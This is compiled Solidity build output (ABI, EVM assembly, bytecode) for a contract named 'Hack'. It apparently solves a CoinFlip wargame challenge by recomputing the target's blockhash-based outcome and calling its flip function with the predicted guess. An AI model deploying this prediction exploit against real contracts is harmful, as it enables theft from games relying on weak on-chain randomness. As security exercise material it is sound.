{
	"contracts/CoinFlip.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_target",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "flip",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/CoinFlip.sol\":57:660  contract Hack{... */\n  mstore(0x40, 0xa0)\n    /* \"contracts/CoinFlip.sol\":132:209  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"contracts/CoinFlip.sol\":115:209  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x00\n  sstore\n    /* \"contracts/CoinFlip.sol\":216:287  constructor(address _target){... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/CoinFlip.sol\":272:279  _target */\n  dup1\n    /* \"contracts/CoinFlip.sol\":254:280  target = CoinFlip(_target) */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x80\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  pop\n  pop\n    /* \"contracts/CoinFlip.sol\":216:287  constructor(address _target){... */\n  pop\n    /* \"contracts/CoinFlip.sol\":57:660  contract Hack{... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/CoinFlip.sol\":57:660  contract Hack{... */\ntag_6:\n  mload(0x80)\n  codecopy(0x00, dataOffset(sub_0), dataSize(sub_0))\n  0x00\n  assignImmutable(\"0x13600b294191fc92924bb3ce4b969c1e7e2bab8f4c93c3fc6d0a51733df3c060\")\n  return(0x00, dataSize(sub_0))\nstop\n\nsub_0: assembly {\n        /* \"contracts/CoinFlip.sol\":57:660  contract Hack{... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xcde4efa9\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/CoinFlip.sol\":293:413  function flip() external {... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      stop\n    tag_5:\n        /* \"contracts/CoinFlip.sol\":328:338  bool guess */\n      0x00\n        /* \"contracts/CoinFlip.sol\":341:349  _guess() */\n      tag_7\n        /* \"contracts/CoinFlip.sol\":341:347  _guess */\n      tag_8\n        /* \"contracts/CoinFlip.sol\":341:349  _guess() */\n      jump\t// in\n    tag_7:\n        /* \"contracts/CoinFlip.sol\":328:349  bool guess = _guess() */\n      swap1\n      pop\n        /* \"contracts/CoinFlip.sol\":367:373  target */\n      immutable(\"0x13600b294191fc92924bb3ce4b969c1e7e2bab8f4c93c3fc6d0a51733df3c060\")\n        /* \"contracts/CoinFlip.sol\":367:378  target.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"contracts/CoinFlip.sol\":379:384  guess */\n      dup3\n        /* \"contracts/CoinFlip.sol\":367:385  target.flip(guess) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_12\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_12:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n        /* \"contracts/CoinFlip.sol\":359:406  require(target.flip(guess), \"Incorrect Guess!\") */\n      tag_15\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_16\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_15:\n        /* \"contracts/CoinFlip.sol\":318:413  {... */\n      pop\n        /* \"contracts/CoinFlip.sol\":293:413  function flip() external {... */\n      jump\t// out\n        /* \"contracts/CoinFlip.sol\":419:658  function _guess() private view returns (bool) {... */\n    tag_8:\n        /* \"contracts/CoinFlip.sol\":459:463  bool */\n      0x00\n        /* \"contracts/CoinFlip.sol\":475:493  uint256 blockValue */\n      dup1\n        /* \"contracts/CoinFlip.sol\":529:530  1 */\n      0x01\n        /* \"contracts/CoinFlip.sol\":514:526  block.number */\n      number\n        /* \"contracts/CoinFlip.sol\":514:530  block.number - 1 */\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n        /* \"contracts/CoinFlip.sol\":504:531  blockhash(block.number - 1) */\n      blockhash\n        /* \"contracts/CoinFlip.sol\":496:532  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"contracts/CoinFlip.sol\":475:532  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"contracts/CoinFlip.sol\":542:558  uint256 coinFlip */\n      0x00\n        /* \"contracts/CoinFlip.sol\":574:580  FACTOR */\n      dup1\n      sload\n        /* \"contracts/CoinFlip.sol\":561:571  blockValue */\n      dup3\n        /* \"contracts/CoinFlip.sol\":561:580  blockValue / FACTOR */\n      tag_21\n      swap2\n      swap1\n      tag_22\n      jump\t// in\n    tag_21:\n        /* \"contracts/CoinFlip.sol\":542:580  uint256 coinFlip = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"contracts/CoinFlip.sol\":590:599  bool side */\n      0x00\n        /* \"contracts/CoinFlip.sol\":614:615  1 */\n      0x01\n        /* \"contracts/CoinFlip.sol\":602:610  coinFlip */\n      dup3\n        /* \"contracts/CoinFlip.sol\":602:615  coinFlip == 1 */\n      eq\n        /* \"contracts/CoinFlip.sol\":602:630  coinFlip == 1 ? true : false */\n      tag_23\n      jumpi\n        /* \"contracts/CoinFlip.sol\":625:630  false */\n      0x00\n        /* \"contracts/CoinFlip.sol\":602:630  coinFlip == 1 ? true : false */\n      jump(tag_24)\n    tag_23:\n        /* \"contracts/CoinFlip.sol\":618:622  true */\n      0x01\n        /* \"contracts/CoinFlip.sol\":602:630  coinFlip == 1 ? true : false */\n    tag_24:\n        /* \"contracts/CoinFlip.sol\":590:630  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"contracts/CoinFlip.sol\":647:651  side */\n      dup1\n        /* \"contracts/CoinFlip.sol\":640:651  return side */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/CoinFlip.sol\":419:658  function _guess() private view returns (bool) {... */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:97   */\n    tag_25:\n        /* \"#utility.yul\":41:48   */\n      0x00\n        /* \"#utility.yul\":84:89   */\n      dup2\n        /* \"#utility.yul\":77:90   */\n      iszero\n        /* \"#utility.yul\":70:91   */\n      iszero\n        /* \"#utility.yul\":59:91   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:97   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":103:212   */\n    tag_26:\n        /* \"#utility.yul\":184:205   */\n      tag_41\n        /* \"#utility.yul\":199:204   */\n      dup2\n        /* \"#utility.yul\":184:205   */\n      tag_25\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":179:182   */\n      dup3\n        /* \"#utility.yul\":172:206   */\n      mstore\n        /* \"#utility.yul\":103:212   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":218:428   */\n    tag_10:\n        /* \"#utility.yul\":305:309   */\n      0x00\n        /* \"#utility.yul\":343:345   */\n      0x20\n        /* \"#utility.yul\":332:341   */\n      dup3\n        /* \"#utility.yul\":328:346   */\n      add\n        /* \"#utility.yul\":320:346   */\n      swap1\n      pop\n        /* \"#utility.yul\":356:421   */\n      tag_43\n        /* \"#utility.yul\":418:419   */\n      0x00\n        /* \"#utility.yul\":407:416   */\n      dup4\n        /* \"#utility.yul\":403:420   */\n      add\n        /* \"#utility.yul\":394:400   */\n      dup5\n        /* \"#utility.yul\":356:421   */\n      tag_26\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":218:428   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":515:632   */\n    tag_28:\n        /* \"#utility.yul\":624:625   */\n      0x00\n        /* \"#utility.yul\":621:622   */\n      dup1\n        /* \"#utility.yul\":614:626   */\n      revert\n        /* \"#utility.yul\":761:877   */\n    tag_30:\n        /* \"#utility.yul\":831:852   */\n      tag_48\n        /* \"#utility.yul\":846:851   */\n      dup2\n        /* \"#utility.yul\":831:852   */\n      tag_25\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":824:829   */\n      dup2\n        /* \"#utility.yul\":821:853   */\n      eq\n        /* \"#utility.yul\":811:871   */\n      tag_49\n      jumpi\n        /* \"#utility.yul\":867:868   */\n      0x00\n        /* \"#utility.yul\":864:865   */\n      dup1\n        /* \"#utility.yul\":857:869   */\n      revert\n        /* \"#utility.yul\":811:871   */\n    tag_49:\n        /* \"#utility.yul\":761:877   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":883:1020   */\n    tag_31:\n        /* \"#utility.yul\":937:942   */\n      0x00\n        /* \"#utility.yul\":968:974   */\n      dup2\n        /* \"#utility.yul\":962:975   */\n      mload\n        /* \"#utility.yul\":953:975   */\n      swap1\n      pop\n        /* \"#utility.yul\":984:1014   */\n      tag_51\n        /* \"#utility.yul\":1008:1013   */\n      dup2\n        /* \"#utility.yul\":984:1014   */\n      tag_30\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":883:1020   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1026:1371   */\n    tag_14:\n        /* \"#utility.yul\":1093:1099   */\n      0x00\n        /* \"#utility.yul\":1142:1144   */\n      0x20\n        /* \"#utility.yul\":1130:1139   */\n      dup3\n        /* \"#utility.yul\":1121:1128   */\n      dup5\n        /* \"#utility.yul\":1117:1140   */\n      sub\n        /* \"#utility.yul\":1113:1145   */\n      slt\n        /* \"#utility.yul\":1110:1229   */\n      iszero\n      tag_53\n      jumpi\n        /* \"#utility.yul\":1148:1227   */\n      tag_54\n      tag_28\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":1110:1229   */\n    tag_53:\n        /* \"#utility.yul\":1268:1269   */\n      0x00\n        /* \"#utility.yul\":1293:1354   */\n      tag_55\n        /* \"#utility.yul\":1346:1353   */\n      dup5\n        /* \"#utility.yul\":1337:1343   */\n      dup3\n        /* \"#utility.yul\":1326:1335   */\n      dup6\n        /* \"#utility.yul\":1322:1344   */\n      add\n        /* \"#utility.yul\":1293:1354   */\n      tag_31\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":1283:1354   */\n      swap2\n      pop\n        /* \"#utility.yul\":1239:1364   */\n      pop\n        /* \"#utility.yul\":1026:1371   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1377:1546   */\n    tag_32:\n        /* \"#utility.yul\":1461:1472   */\n      0x00\n        /* \"#utility.yul\":1495:1501   */\n      dup3\n        /* \"#utility.yul\":1490:1493   */\n      dup3\n        /* \"#utility.yul\":1483:1502   */\n      mstore\n        /* \"#utility.yul\":1535:1539   */\n      0x20\n        /* \"#utility.yul\":1530:1533   */\n      dup3\n        /* \"#utility.yul\":1526:1540   */\n      add\n        /* \"#utility.yul\":1511:1540   */\n      swap1\n      pop\n        /* \"#utility.yul\":1377:1546   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1552:1718   */\n    tag_33:\n        /* \"#utility.yul\":1692:1710   */\n      0x496e636f72726563742047756573732100000000000000000000000000000000\n        /* \"#utility.yul\":1688:1689   */\n      0x00\n        /* \"#utility.yul\":1680:1686   */\n      dup3\n        /* \"#utility.yul\":1676:1690   */\n      add\n        /* \"#utility.yul\":1669:1711   */\n      mstore\n        /* \"#utility.yul\":1552:1718   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1724:2090   */\n    tag_34:\n        /* \"#utility.yul\":1866:1869   */\n      0x00\n        /* \"#utility.yul\":1887:1954   */\n      tag_59\n        /* \"#utility.yul\":1951:1953   */\n      0x10\n        /* \"#utility.yul\":1946:1949   */\n      dup4\n        /* \"#utility.yul\":1887:1954   */\n      tag_32\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1880:1954   */\n      swap2\n      pop\n        /* \"#utility.yul\":1963:2056   */\n      tag_60\n        /* \"#utility.yul\":2052:2055   */\n      dup3\n        /* \"#utility.yul\":1963:2056   */\n      tag_33\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":2081:2083   */\n      0x20\n        /* \"#utility.yul\":2076:2079   */\n      dup3\n        /* \"#utility.yul\":2072:2084   */\n      add\n        /* \"#utility.yul\":2065:2084   */\n      swap1\n      pop\n        /* \"#utility.yul\":1724:2090   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2096:2515   */\n    tag_17:\n        /* \"#utility.yul\":2262:2266   */\n      0x00\n        /* \"#utility.yul\":2300:2302   */\n      0x20\n        /* \"#utility.yul\":2289:2298   */\n      dup3\n        /* \"#utility.yul\":2285:2303   */\n      add\n        /* \"#utility.yul\":2277:2303   */\n      swap1\n      pop\n        /* \"#utility.yul\":2349:2358   */\n      dup2\n        /* \"#utility.yul\":2343:2347   */\n      dup2\n        /* \"#utility.yul\":2339:2359   */\n      sub\n        /* \"#utility.yul\":2335:2336   */\n      0x00\n        /* \"#utility.yul\":2324:2333   */\n      dup4\n        /* \"#utility.yul\":2320:2337   */\n      add\n        /* \"#utility.yul\":2313:2360   */\n      mstore\n        /* \"#utility.yul\":2377:2508   */\n      tag_62\n        /* \"#utility.yul\":2503:2507   */\n      dup2\n        /* \"#utility.yul\":2377:2508   */\n      tag_34\n      jump\t// in\n    tag_62:\n        /* \"#utility.yul\":2369:2508   */\n      swap1\n      pop\n        /* \"#utility.yul\":2096:2515   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2521:2598   */\n    tag_35:\n        /* \"#utility.yul\":2558:2565   */\n      0x00\n        /* \"#utility.yul\":2587:2592   */\n      dup2\n        /* \"#utility.yul\":2576:2592   */\n      swap1\n      pop\n        /* \"#utility.yul\":2521:2598   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2604:2784   */\n    tag_36:\n        /* \"#utility.yul\":2652:2729   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2649:2650   */\n      0x00\n        /* \"#utility.yul\":2642:2730   */\n      mstore\n        /* \"#utility.yul\":2749:2753   */\n      0x11\n        /* \"#utility.yul\":2746:2747   */\n      0x04\n        /* \"#utility.yul\":2739:2754   */\n      mstore\n        /* \"#utility.yul\":2773:2777   */\n      0x24\n        /* \"#utility.yul\":2770:2771   */\n      0x00\n        /* \"#utility.yul\":2763:2778   */\n      revert\n        /* \"#utility.yul\":2790:2984   */\n    tag_20:\n        /* \"#utility.yul\":2830:2834   */\n      0x00\n        /* \"#utility.yul\":2850:2870   */\n      tag_66\n        /* \"#utility.yul\":2868:2869   */\n      dup3\n        /* \"#utility.yul\":2850:2870   */\n      tag_35\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":2845:2870   */\n      swap2\n      pop\n        /* \"#utility.yul\":2884:2904   */\n      tag_67\n        /* \"#utility.yul\":2902:2903   */\n      dup4\n        /* \"#utility.yul\":2884:2904   */\n      tag_35\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":2879:2904   */\n      swap3\n      pop\n        /* \"#utility.yul\":2928:2929   */\n      dup3\n        /* \"#utility.yul\":2925:2926   */\n      dup3\n        /* \"#utility.yul\":2921:2930   */\n      sub\n        /* \"#utility.yul\":2913:2930   */\n      swap1\n      pop\n        /* \"#utility.yul\":2952:2953   */\n      dup2\n        /* \"#utility.yul\":2946:2950   */\n      dup2\n        /* \"#utility.yul\":2943:2954   */\n      gt\n        /* \"#utility.yul\":2940:2977   */\n      iszero\n      tag_68\n      jumpi\n        /* \"#utility.yul\":2957:2975   */\n      tag_69\n      tag_36\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":2940:2977   */\n    tag_68:\n        /* \"#utility.yul\":2790:2984   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2990:3170   */\n    tag_37:\n        /* \"#utility.yul\":3038:3115   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":3035:3036   */\n      0x00\n        /* \"#utility.yul\":3028:3116   */\n      mstore\n        /* \"#utility.yul\":3135:3139   */\n      0x12\n        /* \"#utility.yul\":3132:3133   */\n      0x04\n        /* \"#utility.yul\":3125:3140   */\n      mstore\n        /* \"#utility.yul\":3159:3163   */\n      0x24\n        /* \"#utility.yul\":3156:3157   */\n      0x00\n        /* \"#utility.yul\":3149:3164   */\n      revert\n        /* \"#utility.yul\":3176:3361   */\n    tag_22:\n        /* \"#utility.yul\":3216:3217   */\n      0x00\n        /* \"#utility.yul\":3233:3253   */\n      tag_72\n        /* \"#utility.yul\":3251:3252   */\n      dup3\n        /* \"#utility.yul\":3233:3253   */\n      tag_35\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":3228:3253   */\n      swap2\n      pop\n        /* \"#utility.yul\":3267:3287   */\n      tag_73\n        /* \"#utility.yul\":3285:3286   */\n      dup4\n        /* \"#utility.yul\":3267:3287   */\n      tag_35\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":3262:3287   */\n      swap3\n      pop\n        /* \"#utility.yul\":3306:3307   */\n      dup3\n        /* \"#utility.yul\":3296:3331   */\n      tag_74\n      jumpi\n        /* \"#utility.yul\":3311:3329   */\n      tag_75\n      tag_37\n      jump\t// in\n    tag_75:\n        /* \"#utility.yul\":3296:3331   */\n    tag_74:\n        /* \"#utility.yul\":3353:3354   */\n      dup3\n        /* \"#utility.yul\":3350:3351   */\n      dup3\n        /* \"#utility.yul\":3346:3355   */\n      div\n        /* \"#utility.yul\":3341:3355   */\n      swap1\n      pop\n        /* \"#utility.yul\":3176:3361   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220cb5ef5b960a737982d1eb8aae9a402bacd08d540ed2200e09e256097cf7c8c8d64736f6c634300081a0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60a06040527f80000000000000000000000000000000000000000000000000000000000000005f55348015610032575f80fd5b5060405161048c38038061048c833981810160405281019061005491906100ec565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff168152505050610117565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100bb82610092565b9050919050565b6100cb816100b1565b81146100d5575f80fd5b50565b5f815190506100e6816100c2565b92915050565b5f602082840312156101015761010061008e565b5b5f61010e848285016100d8565b91505092915050565b60805161035e61012e5f395f6044015261035e5ff3fe608060405234801561000f575f80fd5b5060043610610029575f3560e01c8063cde4efa91461002d575b5f80fd5b610035610037565b005b5f61004061011d565b90507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b815260040161009b9190610178565b6020604051808303815f875af11580156100b7573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100db91906101bf565b61011a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161011190610244565b60405180910390fd5b50565b5f8060014361012c9190610298565b405f1c90505f80548261013f91906102f8565b90505f60018214610150575f610153565b60015b905080935050505090565b5f8115159050919050565b6101728161015e565b82525050565b5f60208201905061018b5f830184610169565b92915050565b5f80fd5b61019e8161015e565b81146101a8575f80fd5b50565b5f815190506101b981610195565b92915050565b5f602082840312156101d4576101d3610191565b5b5f6101e1848285016101ab565b91505092915050565b5f82825260208201905092915050565b7f496e636f727265637420477565737321000000000000000000000000000000005f82015250565b5f61022e6010836101ea565b9150610239826101fa565b602082019050919050565b5f6020820190508181035f83015261025b81610222565b9050919050565b5f819050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f6102a282610262565b91506102ad83610262565b92508282039050818111156102c5576102c461026b565b5b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61030282610262565b915061030d83610262565b92508261031d5761031c6102cb565b5b82820490509291505056fea2646970667358221220cb5ef5b960a737982d1eb8aae9a402bacd08d540ed2200e09e256097cf7c8c8d64736f6c634300081a0033",
					"opcodes": "PUSH1 0xA0 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH0 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x32 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x48C CODESIZE SUB DUP1 PUSH2 0x48C DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x54 SWAP2 SWAP1 PUSH2 0xEC JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x80 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP POP PUSH2 0x117 JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xBB DUP3 PUSH2 0x92 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xCB DUP2 PUSH2 0xB1 JUMP JUMPDEST DUP2 EQ PUSH2 0xD5 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xE6 DUP2 PUSH2 0xC2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x101 JUMPI PUSH2 0x100 PUSH2 0x8E JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x10E DUP5 DUP3 DUP6 ADD PUSH2 0xD8 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x80 MLOAD PUSH2 0x35E PUSH2 0x12E PUSH0 CODECOPY PUSH0 PUSH1 0x44 ADD MSTORE PUSH2 0x35E PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xCDE4EFA9 EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x35 PUSH2 0x37 JUMP JUMPDEST STOP JUMPDEST PUSH0 PUSH2 0x40 PUSH2 0x11D JUMP JUMPDEST SWAP1 POP PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x9B SWAP2 SWAP1 PUSH2 0x178 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xB7 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xDB SWAP2 SWAP1 PUSH2 0x1BF JUMP JUMPDEST PUSH2 0x11A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x111 SWAP1 PUSH2 0x244 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP1 PUSH1 0x1 NUMBER PUSH2 0x12C SWAP2 SWAP1 PUSH2 0x298 JUMP JUMPDEST BLOCKHASH PUSH0 SHR SWAP1 POP PUSH0 DUP1 SLOAD DUP3 PUSH2 0x13F SWAP2 SWAP1 PUSH2 0x2F8 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH1 0x1 DUP3 EQ PUSH2 0x150 JUMPI PUSH0 